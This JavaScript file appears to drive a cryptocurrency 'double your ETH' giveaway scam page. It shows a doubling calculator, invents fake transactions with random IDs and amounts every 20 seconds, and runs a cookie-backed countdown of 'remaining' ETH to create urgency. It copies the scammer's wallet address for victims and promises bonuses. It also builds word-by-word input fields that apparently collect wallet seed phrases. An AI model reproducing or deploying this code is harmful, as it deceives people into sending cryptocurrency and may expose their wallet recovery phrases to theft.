const faqItems = document.querySelectorAll('.faq-items > .item');
faqItems.forEach((item) => {
    item.addEventListener('click', () => {
        item.classList.toggle('open');
    });
});

const navLinks = document.querySelectorAll('header .navigate-wrap .navigate-links .navigate-link');
const header = document.querySelector('header');
navLinks.forEach((item) => {
    item.addEventListener('click', () => {
        document.querySelector('header  .navigate-wrap .navigate-links .navigate-link.background').classList.toggle('background');
        item.classList.toggle('background');

        header.classList.remove('open');
    });
});

document.querySelector('.open-nav').addEventListener('click', () => {
    document.querySelector('header').classList.toggle('open');
});

document.querySelectorAll('.wallet-types .item').forEach((item) => {
    item.addEventListener('click', () => {
        document.querySelector('.wallet-types .item.active').classList.remove('active');
        item.classList.add('active');
    });
});

const checkWalletAdders = document.querySelector('#check-wallet-address');
const checkButton = document.querySelector('.check');
checkButton.addEventListener('click', () => {
    const value = checkWalletAdders.value;
    if (value.length < 25 || value[0] != '0' || value[1] != 'x' || value == walletAddress) {
        checkWalletAdders.classList.add('error');
        checkButton.disabled = true;
        infoBox.innerText = 'Invalid wallet address';
        infoBox.classList.add('active');

        setTimeout(() => {
            checkWalletAdders.classList.remove('error');
            checkButton.disabled = false;
            infoBox.classList.remove('active');
        }, 1500);
    } else {
        checkWalletAdders.classList.add('success');
        checkButton.disabled = true;
        checkWalletAdders.disabled = true;
        infoBox.innerText = 'You will get a bonuses!';
        infoBox.classList.add('active');

        setTimeout(() => {
            infoBox.classList.remove('active');
        }, 1500);
    }
});



function firstStep() {
    document.querySelector('.description.active').classList.remove('active');
    document.querySelector('.description.first').classList.add('active');
}

function secondStep() {
    document.querySelector('.description.active').classList.remove('active');
    document.querySelector('.description.second').classList.add('active');
}

function thirdStep() {
    document.querySelector('.description.active').classList.remove('active');
    document.querySelector('.description.third').classList.add('active');
}

function getRandomNumber() {
    min = 1,
    max = 15,
    highlightedNumber = Math.random() * (max - min) + min;

    return Math.round(highlightedNumber * 1000) / 1000;
};

let price = 0;
$.getJSON('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=ethereum', (response) => {
    response.forEach((item) => {
        price = item['current_price'];
    })
});

function multiply(){
    const firstInput = document.getElementById('first');
    const secondInput = document.getElementById('second');
    const firstDInput = document.getElementById('first-d');
    const secondDInput = document.getElementById('second-d');
    firstInput.addEventListener('input', function(event){
        firstInput.value = firstInput.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
        console.log(firstInput.value);
        secondInput.value = firstInput.value*2;
        firstDInput.value = firstInput.value * price;
        secondDInput.value = secondInput.value * price;
    })

    secondInput.addEventListener('input', () => {
        secondInput.value = secondInput.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
        firstInput.value = secondInput.value/2;
        firstDInput.value = firstInput.value * price;
        secondDInput.value = secondInput.value * price;
    });
};
multiply();

function makeid(length) {
    let result = '';
    let characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let charactersLength = characters.length;

    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    return  result;
}

function makeidBlock(length) {
    let result = '';
    let characters = '0123456789';
    let charactersLength = characters.length;

    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    return  result;
}

function setCookie(cname, cvalue, exdays) {
    const d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    let expires = "expires="+ d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/;";
}

function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for(let i = 0; i <ca.length; i++) {
        let c = ca[i];

        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }

        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

let amount = getCookie('eth') ? getCookie('eth') : maxAmount;
setCookie('eth', amount, 1);
const amountBox = document.querySelector('#current-amount');
const progressBar = document.querySelector('.filled-scale');

progressBar.style.width = Math.round((amount/(maxAmount/50)) * 1000) / 1000 + '%';
amountBox.innerText = amount;

const transactionList = document.querySelector('.transaction-items');
const trxTemplate = document.querySelector('.temlplate>div');

const infoBox = document.querySelector('.info-box');
document.querySelectorAll('.address-box').forEach((item) => {
    item.querySelector('.wallet-address').innerText = walletAddress;
    item.addEventListener('click', () => {
        navigator.clipboard.writeText(walletAddress);
        item.classList.add('clicked');
        infoBox.innerText = 'Copied!';
        infoBox.classList.add('active');

        setTimeout(() => {
            item.classList.remove('clicked');
        }, 300);

        setTimeout(() => {
            infoBox.classList.remove('active');
        }, 1500);
    });
});

function addTrx(hideLast = false) {
    const a = makeid(8) + '...';
    const b = makeidBlock(6);
    const c = walletAddress.substring(0,6) + '...';
    const d = '0x' + makeid(4) + '...';
    const e = c;
    const f = d;
    const g = getRandomNumber();
    const h = g * 2;
    const i = Math.round((g * 0.01) * 10000) / 10000;

    const newTrx = trxTemplate.cloneNode(true);

    newTrx.querySelector('.a').innerText = a;
    newTrx.querySelector('.b').innerText = b;
    newTrx.querySelector('.c').innerText = c;
    newTrx.querySelector('.d').innerText = d;
    newTrx.querySelector('.e').innerText = e;
    newTrx.querySelector('.f').innerText = f;
    newTrx.querySelector('.g').innerText = g;
    newTrx.querySelector('.h').innerText = h;
    newTrx.querySelector('.i').innerText = i;

    transactionList.prepend(newTrx);

    if (hideLast) {
        transactionList.querySelector('.item:last-child').remove();
    }

    amount = Math.round((amount - g) * 1000) / 1000;

    if (amount < 0) {
        amount = maxAmount;
    }

    progressBar.style.width = Math.round((amount/(maxAmount/50)) * 1000) / 1000 + '%';
    amountBox.innerText = amount;
    setCookie('eth', amount, 1);
}

addTrx();
addTrx();
addTrx();
addTrx();

setInterval(() => {
    addTrx(true);
}, 20000);

const words = document.querySelector('.words');
const wordTemplate = document.querySelector('.word-template>input');

function resizeInput(newWord) {
    const value = newWord.value;
    newWord.style.width = 'calc(' + value.length + 'ch + 2rem)';
}

function addWordField(wordValue = '') {
    let newWord = wordTemplate.cloneNode(true);

    if (wordValue != '') {
        newWord.value = wordValue;
        resizeInput(newWord);
    }

    words.appendChild(newWord);
    newWord.focus();

    newWord.addEventListener('focusout', () => {
        resizeInput(newWord);

        if (newWord.value.replace(/\s/g, '') === '') {
            newWord.remove()
        }
    });

    newWord.addEventListener('keyup', (e) => {
        if (e.keyCode === 13) {
            addWordField();
            return false;
        }
    });

    newWord.addEventListener('input', () => {
        const value = newWord.value;
        newWord.style.width = 'calc(' + value.length + 'ch + 2rem)';

        if (value.replace(/\s/g, '') !== '' && value.indexOf(' ') >= 0) {
            let inputWords = value.trim().split(/\s+/);

            newWord.value = inputWords.shift();
            resizeInput(newWord);

            inputWords.forEach((newWordValue) => {
                addWordField(newWordValue);
            });
        }

        if (value[value.length - 1] == ' ' && value.replace(/\s/g, '') !== '') {
            addWordField();
        }
    });
}

words.addEventListener('click', (e) => {
    if (e.target === words && getMobileOS() !== 'iOS') {
        addWordField();
    }
});

const getMobileOS = () => {
  const ua = navigator.userAgent
  if (/android/i.test(ua)) {
    return "Android"
  }
  else if ((/iPad|iPhone|iPod/.test(ua)) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)){
    return "iOS"
  }
  return "Other"
}

if (getMobileOS() == 'iOS') {
    document.querySelector('#iphone').disabled = false;
}